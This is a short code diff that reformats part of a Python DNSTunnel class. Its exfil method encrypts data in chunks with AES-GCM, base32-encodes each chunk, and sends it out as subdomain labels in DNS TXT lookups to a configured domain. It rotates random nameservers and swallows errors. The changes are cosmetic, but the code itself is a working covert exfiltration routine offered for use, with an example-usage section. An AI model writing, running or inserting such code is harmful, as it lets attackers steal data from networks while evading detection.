@@ -24,16 +24,18 @@ class DNSTunnel:
         ct = self.aesgcm.encrypt(nonce, data, None)
         # For DNS, encode the combined nonce+ciphertext in base32 (without padding)
         from base64 import b32encode
-        return b32encode(nonce + ct).decode().rstrip('=')
+
+        return b32encode(nonce + ct).decode().rstrip("=")
 
     def exfil(self, data: bytes, chunk_size=48):
         for i in range(0, len(data), chunk_size):
             sub = random.SystemRandom().choice(self.subdomains)
-            host = f"{self._encrypt(data[i:i+chunk_size])}.{sub}.{self.domain}"
+            host = f"{self._encrypt(data[i : i + chunk_size])}.{sub}.{self.domain}"
             try:
-                dns.resolver.resolve(host, 'TXT', nameserver=random.choice(self.nameservers))
+                dns.resolver.resolve(host, "TXT", nameserver=random.choice(self.nameservers))
             except dns.exception.DNSException:
                 pass
+
 
 # Example usage:
 if __name__ == "__main__":
